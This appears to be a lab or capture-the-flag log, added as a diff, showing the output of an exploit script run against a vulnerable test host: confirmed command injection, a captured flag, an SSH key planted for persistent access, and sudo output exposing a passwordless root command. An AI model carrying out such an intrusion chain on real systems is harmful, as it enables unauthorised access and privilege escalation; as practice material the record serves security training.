@@ -1,0 +1,21 @@
+012 SSH Bypass Sudo Confirmation
+Dtae: 01/08/2026 |00:15:46
+
+PS C:\Users\FEMI\Desktop\EH-6\exploit_chain> python exploit.py http://192.168.77.21:8080
+[+] health check ok                                                          
+[+] baseline ok
+[+] injection confirmed
+[+] running as: support
+[+] user flag: 127.0.0.1       localhost
+UBI{A6_USER_F2557845D2AABFDAEF146657}
+[+] ssh key injected
+127.0.0.1       localhost
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKsz/sUtoGDsLsf/8zLM2Z+TyNH7204VYUO04Avn4sV1 stage6-exploit
+
+STDOUT: Matching Defaults entries for support on nf-eh-a2-vulnerable:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User support may run the following commands on nf-eh-a2-vulnerable:
+    (root) NOPASSWD: /usr/local/sbin/support-backup
+
+STDERR: Warning: Permanently added '192.168.77.21' (ED25519) to the list of known hosts.
